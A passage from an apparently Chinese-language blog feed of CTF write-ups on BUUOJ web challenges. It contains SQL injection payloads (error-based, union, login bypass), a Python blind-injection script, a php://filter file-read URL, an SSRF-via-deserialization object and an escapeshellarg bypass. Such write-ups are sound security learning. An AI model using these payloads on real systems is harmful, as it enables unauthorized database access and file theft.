  <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token punctuation">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>_SERVER['HTTP_X_FORWARDED_FOR'],$_SERVER['REMOTE_ADDR']</code>，把用户IP设置为用户的x_forwarded_for<br>传入一个host参数，连续对host用<code>escapeshellarg和escapeshellcmd处理</code><br>这俩函数没见过，查一下</p><pre class=" language-bash"><code class="language-bash">escapeshellarg<span class="token punctuation">(</span><span class="token punctuation">)</span> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec<span class="token punctuation">(</span><span class="token punctuation">)</span>, system<span class="token punctuation">(</span><span class="token punctuation">)</span> 执行运算符 escapeshellcmd<span class="token punctuation">(</span><span class="token punctuation">)</span> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec<span class="token punctuation">(</span><span class="token punctuation">)</span> 或 system<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数，或者 执行操作符 之前进行转义</code></pre><p>这两个函数放在一起肯定会造成漏洞(不然为啥放在简短的源代码里)<br>果然可以查到这两个函数的漏洞<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p><pre class=" language-bash"><code class="language-bash">传入的参数是：172.17.0.2<span class="token string">' -v -d a=1经过escapeshellarg处理后变成了'</span>172.17.0.2<span class="token string">'\''</span> -v -d a<span class="token operator">=</span>1<span class="token string">'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。经过escapeshellcmd处理后变成'</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php最后执行的命令是curl '</span>172.17.0.2<span class="token string">'\\'</span><span class="token string">' -v -d a=1\'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="token string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向172.17.0.2\发起请求，POST 数据为a<span class="token operator">=</span>1' 它们在配合时并没有考虑到单引号带来的隐患                   </code></pre><p>就是说两次转义后单引号出问题了<br>再往下看，system会执行nmap的命令，扫描$host指定的机器<br>很显然我们需要利用nmap来做些什么</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 绕过escapeshellarg()+escapeshellcmd() </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]Secret File</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/1.jpg" alt=""><br>查看源代码，发现一个页面<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/2.jpg" alt=""><br>跳转过去<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/3.jpg" alt=""><br>点一下secret<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/4.jpg" alt=""><br>看到这个页面果断上burp<br>得到另一个页面<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/5.jpg" alt=""><br>跳转过去得到代码</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//flag放在了flag.php里</span><span class="token delimiter">?></span></code></pre><p>根据程序，我们要传入一个file参数为flag.php<br>然而却回显了这么一个页面<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/6.jpg" alt=""><br>有点懵<br>burp上查看一下<br>也没有<br>看看控制台的属性是不是设置成hidden了<br>同样也没有<br>真的气，到最后一步了却找不到flag<br>好久之后才想起来flag.php，一个php文件，那我们可以读它的源码啊</p><pre class=" language-bash"><code class="language-bash">http://22795964-60ec-4bea-9b8c-6b944c4ea759.node3.buuoj.cn/secr3t.php?file<span class="token operator">=</span>php://filter/convert.base64-encode/resource<span class="token operator">=</span>flag.php </code></pre><p>果然，返回了flag.php的base64编码，随后解码就可以得到flag<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/7.jpg" alt=""><br>哎，说到底还是太菜，经验也少</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> burp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2018]Fakebook</title>
      <link href="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/"/>
      <url>/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/1.jpg" alt=""><br>注册一个账号，登陆进去<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/2.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/3.jpg" alt=""><br>有一个<code>view.php?no=1</code>的页面，看起来可以sql注入<br>加个单引号测试<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/4.jpg" alt=""><br>报错<br>那么报错注入走一波</p><pre class=" language-bash"><code class="language-bash">?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">)</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> from information_schema.tables where table_schema<span class="token operator">=</span><span class="token string">'fakebook'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> from information_schema.columns where table_name<span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+?no<span class="token operator">=</span>1 and updatexml<span class="token punctuation">(</span>1,concat<span class="token punctuation">(</span><span class="token string">'~'</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>data<span class="token punctuation">)</span> from users<span class="token punctuation">))</span>,1<span class="token punctuation">)</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/5.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/8.jpg" alt=""><br>可以看到用户信息的方式是序列化的<br>那接下来该怎么做，好像没了线索<br>emmmmmm<br>扫一波目录吧<br>果然扫到了好东西<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/9.jpg" alt=""><br>下载来看看</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getBlogContents</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">isValidBlog</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>审计代码<br>定义了一个Userinfo类，属性就是我们注册时输入的那些<br>其中有一个get方法，接受一个url参数</p><pre class=" language-bash"><code class="language-bash">resource curl_init <span class="token punctuation">(</span><span class="token punctuation">[</span> string <span class="token variable">$url</span> <span class="token operator">=</span> NULL <span class="token punctuation">]</span> <span class="token punctuation">)</span>初始化一个新的会话，返回一个cURL句柄，供curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>, curl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>和curl_close<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数使用url如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。你也可以使用curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>函数手动地设置这个值</code></pre><p>实例</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// 创建一个新cURL资源</span><span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 设置URL和相应的选项</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/");</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 抓取URL并把它传递给浏览器</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 关闭cURL资源，并且释放系统资源</span><span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>所以get方法实质上就是返回我们请求的url的页面<br>而下面的的getBlogContents方法则是调用了get方法来请求我们输入的blog<br>即存在SSRF漏洞<br>结合数据存储的方式，我们猜测网站是通过读取用户blog字段，也就是url字段来加载的<br>而在之前的报错注入当中已经爆出了网站的绝对路径<br>我们可以构造blog字段为flag.php的绝对路径来读取flag</p><pre><code>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</code></pre><p>curl不仅支持http，https协议，还支持file协议，我们可以通过file协议来读取flag.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"L"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span><span class="token punctuation">}</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span></code></pre><p>构造sql语句如下</p><pre class=" language-bash"><code class="language-bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no<span class="token operator">=</span>-1/**/union/**/select/**/1,2,3,<span class="token string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+</code></pre><p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/10.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/11.jpg" alt=""><br>有一串base64字符串，解码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/12.jpg" alt=""><br>得到flag</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> PHP反序列化 </tag>
            
            <tag> 报错注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]EasySQL</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/</url>
      
        <content type="html"><![CDATA[<p>打开环境，登录框<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/1.jpg" alt=""><br>随便登陆测试一下<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/2.jpg" alt=""><br>不出意外的失败<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/3.jpg" alt=""><br>登陆框的sql语句大概就是<br><code>select * from table where username='$username' and password='$password'</code><br>那么万能密码先走一波<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/4.jpg" alt=""><br>构造成<br><code>select * from table where username='admin' or 1=1#' and password='123'</code><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/5.jpg" alt=""><br>成功</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> sql万能密码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[极客大挑战 2019]Havefun</title>
      <link href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/"/>
      <url>/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/</url>
      
        <content type="html"><![CDATA[<p>打开环境<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/1.jpg" alt=""><br>查看源代码，在最末端发现提示<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/3.jpg" alt=""><br>基础，传参cat=dog即可<br><img src="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-havefun/4.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack World</title>
      <link href="/LawlietLW.github.io/2020/02/09/hack-world/"/>
      <url>/LawlietLW.github.io/2020/02/09/hack-world/</url>
      
        <content type="html"><![CDATA[<p>打开环境，很明显就是sql注入<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/1.jpg" alt=""><br>输入几个数字测试一下<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/2.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/3.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/4.jpg" alt=""><br>3以后就没有不同的回显了<br>接着测试单引号，输入1’测试<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/5.jpg" alt=""><br>回显<code>bool(false)</code><br>看到bool自然就想到bool盲注，不过我们还得fuzz一下过滤了哪些关键字，直接上bp测试<br>长度为472的都是bool，长度为482的都被探测为sql注入<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/6.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/7.jpg" alt=""><br><img src="/LawlietLW.github.io/2020/02/09/hack-world/8.jpg" alt=""><br>可以看到大部分注入需要的函数都没有被过滤<br>接下来就开始构造payload注入<br>题目已经告诉我们flag所在的表和列都为flag<br>我们构造如下payload惊醒测试<br><code>if(ascii(substr((select(flag)from(flag)),1,1))=102,1,2)--+</code><br>如果为真则返回id=1的结果，否则返回id=2的结果<br><img src="/LawlietLW.github.io/2020/02/09/hack-world/9.jpg" alt=""><br>如预期一样，回显了id=1的结果<br>剩下的就是构造盲注脚本了，脚本可以用二分法，这样快很多<br>不过我懒，选择暴力枚举，脚本如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://8c21b6a5-81a5-4dc0-ac52-8db6ef8583f4.node3.buuoj.cn/index.php"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string">"if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>        data<span class="token operator">=</span><span class="token punctuation">{</span>            <span class="token string">"id"</span><span class="token punctuation">:</span>payload        <span class="token punctuation">}</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'Hello'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            flag<span class="token operator">+=</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"flag为:"</span><span class="token punctuation">,</span>flag<span class="token punctuation">)</span></code></pre><p><img src="/LawlietLW.github.io/2020/02/09/hack-world/10.jpg" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql注入 </tag>
            
            <tag> bool盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/"/>
      <url>/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/</url>
      
        <content type="html"><![CDATA[<p>这两天学习了一些堆的知识，趁热记录一下<br>首先还是熟练的checksec<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/1.jpg" alt=""><br>保护全开，堆题正常操作<br>IDA分析一波<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/2.jpg" alt=""><br>四个功能，增删查改<br>依次进入每个功能查看，首先是Allocate功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/3.jpg" alt=""><br>最大分配16个<br>size最大为4096个字节，通过calloc分配堆，calloc与malloc的区别在于<br>calloc 会将分配的内存空间每一位都初始化为0<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/4.jpg" alt=""><br>这三行代码分别代表flag位，分配即被置1；分配的字节大小；所分配的堆的指针<br>所以转换成结构体即为</p><pre class=" language-c"><code class="language-c"><span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag<span class="token punctuation">;</span>    <span class="token keyword">int</span> lenth<span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span>content<span class="token punctuation">;</span><span class="token punctuation">}</span>note<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span></code></pre><p>再看到Fill功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/5.jpg" alt=""><br>首先判断输入的index是否位于0到15之间并且是否被分配<br>如果是的话则输入content的size<br>漏洞点就在这里，程序并没有判断content的size是否小于我们之前输入的堆的size，如果我们输入更大的size，就可以造成堆溢出</p><p>再看到Free功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/6.jpg" alt=""><br>一开始还是先判断是否存在<br>然后清零所有的数据，并且指针也置NULL<br>free功能并没有漏洞</p><p>最后一个dump功能<br><img src="/LawlietLW.github.io/2020/02/01/babyheap-0ctf-2017/7.jpg" alt=""><br>和上面一样，先判断，然后打印对应序号的堆的内容，没啥问题</p><p>功能分析完后就开始分析漏洞点<br>Fill功能存在堆溢出漏洞，而free功能既没有UAF漏洞也没有double free漏洞，所以这题不能利用常规的通过unsorted bin来泄露libc地址的方法，而是要利用fastbin attack中的一种叫做chunk extend的方法来泄露地址，在这里贴上我看到的一个讲解的很好的链接<a href="https://blog.csdn.net/Breeze_CAT/article/details/103788698" target="_blank" rel="noopener">fastbin 